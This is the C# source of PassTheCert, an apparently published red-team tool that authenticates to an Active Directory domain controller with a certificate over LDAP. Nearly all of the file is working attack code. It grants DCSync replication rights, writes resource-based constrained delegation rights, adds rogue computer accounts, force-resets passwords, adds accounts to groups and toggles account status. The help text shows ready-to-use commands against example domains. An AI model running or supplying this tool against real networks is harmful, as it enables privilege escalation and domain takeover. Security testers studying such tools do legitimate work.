// Copyright 2022 Almond (almond.consulting)
//
// Author: Yannick Méheut (ymeheut@almond.consulting)
//
// Accompanying blog post: https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

using System;
using System.IO;
using System.Text;
using System.DirectoryServices.Protocols;
using System.Security.Cryptography.X509Certificates;
using ActiveDs;

namespace PassTheCert
{
    class Program
    {
        static byte[] StringToByteArray(string byte_array_as_string)
        {
            string[] string_split = byte_array_as_string.Split(',');
            byte[] result = new byte[string_split.Length];

            for (int i = 0; i < result.Length; i++)
            {
                result[i] = Convert.ToByte(string_split[i]);
            }

            return result;
        }

        static string RandomString()
        {
            string charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            StringBuilder output = new StringBuilder();
            Random random = new Random();

            for (int i = 0; i < 32; i++)
            {
                output.Append(charset[random.Next(charset.Length)]);
            }

            return output.ToString();
        }

        static byte[] SecurityDescriptorToByteArray(IADsSecurityDescriptor sd)
        {
            ADsSecurityUtility secUtility = new ADsSecurityUtility();
            byte[] security_descryptor_as_byte_array = (byte[])secUtility.ConvertSecurityDescriptor(sd, (int)ADS_SD_FORMAT_ENUM.ADS_SD_FORMAT_IID, (int)ADS_SD_FORMAT_ENUM.ADS_SD_FORMAT_RAW);

            return security_descryptor_as_byte_array;
        }

        static string SaveSecurityDescriptor(string target, string attribute, byte[] security_descriptor)
        {
            string file_name = (target + "_" + attribute + "_" + DateTime.Now.ToString("yyyyMMddTHHmmssZ") + ".txt").Replace(' ', '_');
            string sd_as_string = string.Join(",", security_descriptor);

            // We write to disk
            File.WriteAllText(file_name, sd_as_string);

            string sd_read_from_file = File.ReadAllText(file_name);

            if (sd_as_string.Equals(sd_read_from_file))
            {
                return file_name;
            }
            else
            {
                return null;
            }
        }

        static AccessControlEntry CreateElevateUserAce(string object_type, string trustee)
        {
            AccessControlEntry ace = new AccessControlEntry();
            ace.AceType = (int)ADS_ACETYPE_ENUM.ADS_ACETYPE_ACCESS_ALLOWED_OBJECT;
            ace.AccessMask = (int)ADS_RIGHTS_ENUM.ADS_RIGHT_DS_CONTROL_ACCESS;
            ace.Flags = (int)ADS_FLAGTYPE_ENUM.ADS_FLAG_OBJECT_TYPE_PRESENT;
            ace.ObjectType = object_type;
            ace.Trustee = trustee;
            return ace;
        }

        static AccessControlEntry CreateRbcdAce(string trustee)
        {
            AccessControlEntry ace = new AccessControlEntry();
            ace.AceType = (int)ADS_ACETYPE_ENUM.ADS_ACETYPE_ACCESS_ALLOWED;
            ace.AccessMask = 983551;
            ace.Trustee = trustee;
            return ace;
        }

        static IADsSecurityDescriptor GetSecurityDescriptor(LdapConnection connection, string target, string filter, string attribute, bool flag_control)
        {
            // Building search request for our target
            SearchRequest search_req = new SearchRequest(target, filter, SearchScope.Subtree, new string[] { attribute });
            if (flag_control)
            {
                search_req.Controls.Add(new SecurityDescriptorFlagControl(SecurityMasks.Dacl));
            }

            SearchResponse resp = null;
            try
            {
                resp = (SearchResponse)connection.SendRequest(search_req);
            }
            catch (DirectoryOperationException)
            {
                Console.WriteLine("Target " + target + " does not exist, stopping attack");
                Environment.Exit(2);
            }
            SearchResultEntry result = resp.Entries[0];

            // Getting current attribute, and parsing as a security descriptor
            byte[] current_security_descriptor = { };
            try
            {
                current_security_descriptor = (byte[])result.Attributes[attribute][0];
                Console.WriteLine(attribute + " attribute exists. Saving old value to disk.");
                string file_name = SaveSecurityDescriptor(target, attribute, current_security_descriptor);
                if (file_name != null)
                {
                    Console.WriteLine("You can restore it using arguments:");
                    Console.WriteLine("\t--target \"" + target + "\" --restore " + file_name);
                }
                else
                {
                    Console.WriteLine("Error! Could not save " + attribute + " value to disk. Stopping attack before we do something we might regret.");
                    Environment.Exit(3);
                }

            }
            catch (NullReferenceException)
            {
                // The attribute is empty, we create an empty security descriptor
                current_security_descriptor = new byte[] { 1, 0, 4, 128, 28, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 20, 0, 0, 0, 2, 0, 8, 0, 0, 0, 0, 0, 1, 2, 0, 0, 0, 0, 0, 5, 32, 0, 0, 0, 32, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
                Console.WriteLine(attribute + " attribute is empty");
                Console.WriteLine("You can clear it using arguments:");
                Console.WriteLine("\t--target \"" + target + "\" --restore clear");
            }

            // We parse the security descriptor
            ADsSecurityUtility sec_utility = new ADsSecurityUtility();
            IADsSecurityDescriptor sd = (IADsSecurityDescriptor)sec_utility.ConvertSecurityDescriptor(current_security_descriptor,
                (int)ADS_SD_FORMAT_ENUM.ADS_SD_FORMAT_RAW,
                (int)ADS_SD_FORMAT_ENUM.ADS_SD_FORMAT_IID);

            return sd;
        }

        static void ModifyAttribute(LdapConnection connection, string target, string attribute, byte[] new_attribute_value, bool encoded_attribute_as_string, DirectoryAttributeOperation operation)
        {
            ModifyRequest modify_req;
            DirectoryAttributeModification attribute_modification = new DirectoryAttributeModification { Name = attribute };
            attribute_modification.Operation = operation;

            if (new_attribute_value != null)
            {
                if (encoded_attribute_as_string)
                {
                    attribute_modification.Add(System.Text.Encoding.Unicode.GetString(new_attribute_value));
                }
                else
                {
                    attribute_modification.Add(new_attribute_value);
                }
            }

            modify_req = new ModifyRequest(target, attribute_modification);
            try
            {
                ModifyResponse mod_resp = (ModifyResponse)connection.SendRequest(modify_req);
                Console.WriteLine(mod_resp.ResultCode.ToString());
            }
            catch (DirectoryOperationException e)
            {
                Console.WriteLine(e.ToString());
                Console.WriteLine("Could not modify attribute " + attribute + ", check that your user has sufficient rights");
            }
        }

        static void AclAttack(LdapConnection connection, string target, string filter, string attribute, AccessControlEntry[] new_aces, string restore_file, bool flag_control)
        {
            byte[] new_security_descriptor = null;
            DirectoryAttributeOperation operation;

            if (restore_file != null)
            {
                if (!restore_file.Equals("clear"))
                {
                    Console.WriteLine("Restoring " + attribute + " attribute from file " + restore_file + ".");
                    new_security_descriptor = StringToByteArray(File.ReadAllText(restore_file));
                }
                else
                {
                    Console.WriteLine("Clearing " + attribute + " attribute.");
                }
            }
            else
            {
                IADsSecurityDescriptor sd = GetSecurityDescriptor(connection, target, filter, attribute, flag_control);
                IADsAccessControlList acl = (IADsAccessControlList)sd.DiscretionaryAcl;

                foreach (AccessControlEntry new_ace in new_aces)
                {
                    acl.AddAce(new_ace);
                }
                sd.DiscretionaryAcl = acl;
                new_security_descriptor = SecurityDescriptorToByteArray(sd);
            }

            if (new_security_descriptor == null)
            {
                operation = DirectoryAttributeOperation.Delete;
            }
            else
            {
                operation = DirectoryAttributeOperation.Replace;
            }

            ModifyAttribute(connection, target, attribute, new_security_descriptor, false, operation);
        }

        static void Whoami(LdapConnection connection)
        {
            ExtendedRequest whoami_req = new ExtendedRequest("1.3.6.1.4.1.4203.1.11.3");

            try
            {
                ExtendedResponse whoami_resp = (ExtendedResponse)connection.SendRequest(whoami_req);
                Console.Write("Querying LDAP As : ");
                Console.WriteLine(System.Text.Encoding.UTF8.GetString(whoami_resp.ResponseValue, 0, whoami_resp.ResponseValue.Length));
            }
            catch (DirectoryOperationException e)
            {
                Console.WriteLine(e.ToString());
            }
        }

        static void ElevateUserAttack(LdapConnection connection, string target, string sid, string restore_file)
        {
            AccessControlEntry[] new_aces = new AccessControlEntry[2];
            if (sid != null)
            {
                new_aces[0] = CreateElevateUserAce("{1131F6AA-9C07-11D1-F79F-00C04FC2DCD2}", sid);
                new_aces[1] = CreateElevateUserAce("{1131F6AD-9C07-11D1-F79F-00C04FC2DCD2}", sid);
            }

            AclAttack(connection, target, "(&(objectCategory=domain))", "nTSecurityDescriptor", new_aces, restore_file, true);
        }

        static void RbcdAttack(LdapConnection connection, string target, string sid, string restore_file)
        {
            AccessControlEntry[] new_aces = new AccessControlEntry[1];
            if (sid != null)
            {
                new_aces[0] = CreateRbcdAce(sid);
            }

            AclAttack(connection, target, "(&(objectCategory=*))", "msDS-AllowedToActOnBehalfOfOtherIdentity", new_aces, restore_file, false);
        }

        static void AddComputerAttack(LdapConnection connection, string computer_name, string computer_password)
        {
            if (!computer_name.EndsWith("$"))
            {
                computer_name += "$";
            }
            if (computer_password == null)
            {
                Console.WriteLine("No password given, generating random one.");
                computer_password = RandomString();
                Console.WriteLine("Generated password: " + computer_password);
            }

            SearchRequest domain_req = new SearchRequest();
            domain_req.Scope = SearchScope.Base;
            domain_req.Filter = "(objectClass=*)";

            SearchResponse domain_resp = (SearchResponse)connection.SendRequest(domain_req);
            SearchResultEntry result = domain_resp.Entries[0];
            string domain_root = (string)result.Attributes["rootDomainNamingContext"][0];
            string domain = string.Join(".", domain_root.Split(',')).Replace("DC=", "");
            string computer_hostname = computer_name.Remove(computer_name.Length - 1);
            string computer_dn = "CN=" + computer_hostname + ",CN=Computers," + domain_root;

            string[] spns = new string[] { "HOST/" + computer_hostname,
                "HOST/" + computer_hostname + "." + domain,
                "RestrictedKrbHost/" + computer_hostname,
                "RestrictedKrbHost/" + computer_hostname + "." + domain};

            string[] object_class = new string[] { "top", "person", "organizationalPerson", "user", "computer" };

            DirectoryAttribute[] attributes = new DirectoryAttribute[] { new DirectoryAttribute("dnsHostName", computer_hostname + "." + domain),
                new DirectoryAttribute("objectClass", object_class),
                new DirectoryAttribute("userAccountControl", "4096"),
                new DirectoryAttribute("servicePrincipalName", spns),
                new DirectoryAttribute("sAMAccountName", computer_name),
                new DirectoryAttribute("unicodePwd", System.Text.Encoding.Unicode.GetBytes('"' + computer_password + '"'))};

            AddRequest add_req = new AddRequest(computer_dn, attributes);

            try
            {
                AddResponse add_resp = (AddResponse)connection.SendRequest(add_req);
                Console.WriteLine(add_resp.ResultCode.ToString());
            }
            catch (DirectoryOperationException e)
            {
                Console.WriteLine(e.ToString());
                Console.WriteLine("Could not create computer " + computer_name + ", check that your user has sufficient rights, or that it does not already exists.");
            }
        }

        static void ResetPasswordAttack(LdapConnection connection, string target, string new_password)
        {
            if (new_password == null)
            {
                Console.WriteLine("No password given, generating random one.");
                new_password = RandomString();
                Console.WriteLine("Generated password: " + new_password);
            }
            byte[] new_password_byte = System.Text.Encoding.Unicode.GetBytes('"' + new_password + '"');

            ModifyAttribute(connection, target, "unicodePwd", new_password_byte, false, DirectoryAttributeOperation.Replace);
        }

        static void AddAccountToGroupAttack(LdapConnection connection, string target, string account)
        {
            ModifyAttribute(connection, target, "member", System.Text.Encoding.Unicode.GetBytes(account), true, DirectoryAttributeOperation.Add);
        }

        static void ToggleAccountStatus(LdapConnection connection, string userDn)
        {
            {
                // Search for the current userAccountControl value
                SearchRequest searchRequest = new SearchRequest(userDn, "(objectClass=user)", SearchScope.Base, "userAccountControl");
                SearchResponse searchResponse = (SearchResponse)connection.SendRequest(searchRequest);
                SearchResultEntry entry = searchResponse.Entries[0];
                int userAccountControl = int.Parse((string)entry.Attributes["userAccountControl"][0]);

                // Define the flag for 'ACCOUNTDISABLE'
                const int ACCOUNTDISABLE = 0x0002;

                // Toggle the 'ACCOUNTDISABLE' flag
                if ((userAccountControl & ACCOUNTDISABLE) > 0)
                {
                    // Currently disabled, enable the account
                    userAccountControl &= ~ACCOUNTDISABLE;
                }
                else
                {
                    // Currently enabled, disable the account
                    userAccountControl |= ACCOUNTDISABLE;
                }

                // Prepare the modification request
                DirectoryAttributeModification modification = new DirectoryAttributeModification();
                modification.Operation = DirectoryAttributeOperation.Replace;
                modification.Name = "userAccountControl";
                modification.Add(userAccountControl.ToString());

                ModifyRequest modifyRequest = new ModifyRequest(userDn, modification);

                // Send the modification request
                ModifyResponse modifyResponse = (ModifyResponse)connection.SendRequest(modifyRequest);
                Console.WriteLine($"Account status toggled. Result: {modifyResponse.ResultCode}");
            }
        }

        static void PrintHelp(int exit_code)
        {
            Console.WriteLine("PassTheCert.exe [--help] --server DOMAIN_CONTROLLER [--start-tls] --cert-path CERT_PATH [--cert-password CERT_PASSWORD] (--elevate|--rbcd|--add-computer|--reset-password|--add-account-to-group) [ATTACK_OPTIONS]");
            Console.WriteLine("GENERAL OPTIONS:");
            Console.WriteLine("\t--server DOMAIN_CONTROLLER");
            Console.WriteLine("\t\tDomain controller to connect to. By default, connection will be done over TCP/636 (LDAPS).");
            Console.WriteLine("\t--start-tls");
            Console.WriteLine("\t\tIndicates that connection should instead be done over TCP/389 (LDAP) and then use StartTLS.");
            Console.WriteLine("\t--cert-path CERT_PATH");
            Console.WriteLine("\t\tPath to the certificate to authenticate with.");
            Console.WriteLine("\t--cert-password CERT_PASSWORD");
            Console.WriteLine("\t\tPassword to the certificate (Optional argument. Default value: <empty>).");
            Console.WriteLine("\n");
            Console.WriteLine("ATTACK TYPE:");
            Console.WriteLine("\t--whoami");
            Console.WriteLine("\t\tQuery LDAP whoami to check if strict validation is being checked");
            Console.WriteLine("\t--elevate");
            Console.WriteLine("\t\tElevate the rights of a user on the domain. Will grant DS-Replication-Get-Changes and DS-Replication-Get-Changes-All rights.");
            Console.WriteLine("\t--rbcd");
            Console.WriteLine("\t\tAdds an SID to the msDS-AllowedToActOnBehalfOfOtherIdentity arttribute of the target.");
            Console.WriteLine("\t--add-computer");
            Console.WriteLine("\t\tAdd a new computer to the domain (useful for RBCD attacks).");
            Console.WriteLine("\t--reset-password");
            Console.WriteLine("\t\tReset the password of the targeted account (requires the User-Force-Change-Password right).");
            Console.WriteLine("\t--add-account-to-group");
            Console.WriteLine("\t\tAdd an account to the given group.");
            Console.WriteLine("\n");
            Console.WriteLine("ELEVATE ATTACK OPTIONS: --target TARGET (--sid SID|--restore RESTORE_FILE)");
            Console.WriteLine("\t--target TARGET");
            Console.WriteLine("\t\tTarget of the attack. Should be the distinguished name of the domain.");
            Console.WriteLine("\t--sid SID");
            Console.WriteLine("\t\tSID to elevate.");
            Console.WriteLine("\t--restore RESTORE_FILE");
            Console.WriteLine("\t\tFile from which to restore the msDS-nTSecurityDescriptor attribute.");
            Console.WriteLine("\t\tYou can use --restore clear to clear the attribute.");
            Console.WriteLine("\n");
            Console.WriteLine("RBCD ATTACK OPTIONS: --target TARGET (--sid SID|--restore RESTORE_FILE)");
            Console.WriteLine("\t--target TARGET");
            Console.WriteLine("\t\tTarget of the attack. Should be the distinguished name of the computer.");
            Console.WriteLine("\t--sid SID");
            Console.WriteLine("\t\tSID to grant RBCD rights to.");
            Console.WriteLine("\t--restore RESTORE_FILE");
            Console.WriteLine("\t\tFile from which to restore the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.");
            Console.WriteLine("\t\tYou can use --restore clear to clear the attribute.");
            Console.WriteLine("\n");
            Console.WriteLine("ADD COMPUTER ATTACK OPTIONS: --computer-name COMPUTER_NAME [--computer-password COMPUTER_PASSWORD]");
            Console.WriteLine("\t--computer-name COMPUTER_NAME");
            Console.WriteLine("\t\tThe name of the computer to add.");
            Console.WriteLine("\t--computer-password COMPUTER_PASSWORD");
            Console.WriteLine("\t\tThe password of the new computer (Optional argument. Default value: <random value>).");
            Console.WriteLine("\n\n");
            Console.WriteLine("RESET PASSWORD ATTACK OPTIONS: --target TARGET [--new-password NEW_PASSWORD]");
            Console.WriteLine("\t--target TARGET");
            Console.WriteLine("\t\tTarget of the attack. Should be the distinguished name of the account.");
            Console.WriteLine("\t--new-password new_PASSWORD");
            Console.WriteLine("\t\tThe new password of the account (Optional argument. Default value: <random value>).");
            Console.WriteLine("\n\n");
            Console.WriteLine("ADD ACCOUNT TO GROUP ATTACK OPTIONS: --target TARGET --account ACCOUNT");
            Console.WriteLine("\t--target TARGET");
            Console.WriteLine("\t\tTarget of the attack. Should be the distinguished name of the group.");
            Console.WriteLine("\t--account ACCOUNT");
            Console.WriteLine("\t\tThe account added to the group. Should be the distinguished name of the account.");
            Console.WriteLine("\n\n");
            Console.WriteLine("TOGGLE ENABLE USER ACCOUNT OPTIONS: --account ACCOUNT --toggle-enabled");
            Console.WriteLine("\t--account ACCOUNT");
            Console.WriteLine("\t\tThe account added enabled/disabled. Should be the distinguished name of the account.");
            Console.WriteLine("\n\n");
            Console.WriteLine("Examples:\n");
            Console.WriteLine("PassTheCert.exe --server ad.contoso.com --cert-path C:\\exchange_server.pfx --elevate --target DC=contoso,DC=com --sid S-1-5-21-453406510-812318184-4183662089-1337");
            Console.WriteLine("\t└> Grants DCSync replication rights on domain contoso.com to SID S-1-5-21-453406510-812318184-4183662089-1337.");
            Console.WriteLine("");
            Console.WriteLine("PassTheCert.exe --server ad.contoso.com --cert-path C:\\ad1.pfx --rbcd --target \"CN=AD1,OU=Domain Controllers,DC=contoso,DC=com\" --sid S-1-5-21-453406510-812318184-4183662089-1337");
            Console.WriteLine("\t└> Grants RBCD rights on domain controller AD1 to SID S-1-5-21-453406510-812318184-4183662089-1337.");
            Console.WriteLine("");
            Console.WriteLine("PassTheCert.exe --server ad.contoso.com --cert-path C:\\ad1.pfx --rbcd --target \"CN=AD1,OU=Domain Controllers,DC=contoso,DC=com\" --restore --restore CN=AD1,OU=Domain_Controllers,DC=contoso,DC=com_msDS-AllowedToActOnBehalfOfOtherIdentity_20220415T224638Z.txt");
            Console.WriteLine("\t└> Sets AD1's msDS-AllowedToActOnBehalfOfOtherIdentity attribute to the value stord in the given file.");
            Console.WriteLine("");
            Console.WriteLine("PassTheCert.exe --server ad.contoso.com --cert-path C:\\user.pfx --add-computer --computer-name DESKTOP-1337$");
            Console.WriteLine("\t└> Create new computer DESKTOP-1337$ with a randomly generated password.");
            Console.WriteLine("");

            Environment.Exit(exit_code);
        }

        static void Main(string[] args)
        {
            // Connection arguments
            string domain_controller = null;
            bool start_tls = false;
            string cert_path = null;
            string cert_password = "";

            // Attack type
            string attack_type = null;

            // Parameters for the different attacks
            //// Parameters for elevate and rbcd attacks
            string target = null;
            string sid = null;
            string restore_file = null;

            //// Parameters for add computer attack
            string computer_name = null;
            string computer_password = null;

            //// Parameters for reset password attack
            string new_password = null;

            //// Parameters for add account to group attack
            string account = null;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    // General options
                    case "--help":
                        PrintHelp(0);
                        return;
                    case "--server":
                        domain_controller = args[i + 1];
                        break;
                    case "--start-tls":
                        start_tls = true;
                        break;
                    case "--cert-path":
                        cert_path = args[i + 1];
                        break;
                    case "--cert-password":
                        cert_password = args[i + 1];
                        break;

                    // Attack type
                    case "--whoami":
                        attack_type = "whoami";
                        break;
                    case "--elevate":
                        attack_type = "elevate";
                        break;
                    case "--rbcd":
                        attack_type = "rbcd";
                        break;
                    case "--add-computer":
                        attack_type = "add_computer";
                        break;
                    case "--reset-password":
                        attack_type = "reset_password";
                        break;
                    case "--toggle-enabled":
                        attack_type = "toggle_enabled";
                        break;
                    case "--add-account-to-group":
                        attack_type = "add_account_to_group";
                        break;

                    // Parameters for elevate, RBCD, reset password, and add account to group attacks
                    case "--target":
                        target = args[i + 1];
                        break;
                    case "--sid":
                        sid = args[i + 1];
                        break;
                    case "--restore":
                        restore_file = args[i + 1];
                        break;

                    // Parameters for add computer attack
                    case "--computer-name":
                        computer_name = args[i + 1];
                        break;
                    case "--computer-password":
                        computer_password = args[i + 1];
                        break;

                    // Additional parameters for reset password attacks
                    case "--new-password":
                        new_password = args[i + 1];
                        break;

                    // Additional parameters for add account to group attacks
                    case "--account":
                        account = args[i + 1];
                        break;
                }
            }

            if (domain_controller == null || cert_path == null)
            {
                Console.WriteLine("Missing mandatory argument (--server or --cert-path)");
                PrintHelp(1);
            }
            int port = start_tls ? 389 : 636;
            LdapDirectoryIdentifier server = new LdapDirectoryIdentifier(domain_controller, port);
            X509Certificate2 certificate = new X509Certificate2(cert_path, cert_password, X509KeyStorageFlags.Exportable);
            LdapConnection connection = new LdapConnection(server);

            connection.ClientCertificates.Add(certificate);
            connection.SessionOptions.VerifyServerCertificate += (conn, cert) => { return true; };
            connection.SessionOptions.QueryClientCertificate += (conn, trust_cas) => { return certificate; };

            if (start_tls)
            {
                connection.SessionOptions.StartTransportLayerSecurity(null);
                connection.AuthType = AuthType.External;
                connection.Bind();
            }
            else
            {
                connection.SessionOptions.SecureSocketLayer = true;
            }

            switch (attack_type)
            {
                case "whoami":
                    Whoami(connection);
                    break;
                case "elevate":
                    ElevateUserAttack(connection, target, sid, restore_file);
                    break;
                case "rbcd":
                    RbcdAttack(connection, target, sid, restore_file);
                    break;
                case "add_computer":
                    AddComputerAttack(connection, computer_name, computer_password);
                    break;
                case "reset_password":
                    ResetPasswordAttack(connection, target, new_password);
                    break;
                case "add_account_to_group":
                    AddAccountToGroupAttack(connection, target, account);
                    break;
                case "toggle_enabled":
                    ToggleAccountStatus(connection, account);
                    break;
                default:
                    Console.WriteLine("Attack type not supported, choose one between --elevate, --rbcd, --add-computer, --reset-password, --toggle-enabled, and --add-account-to-group.\n");
                    PrintHelp(1);
                    break;
            }
        }
    }
}
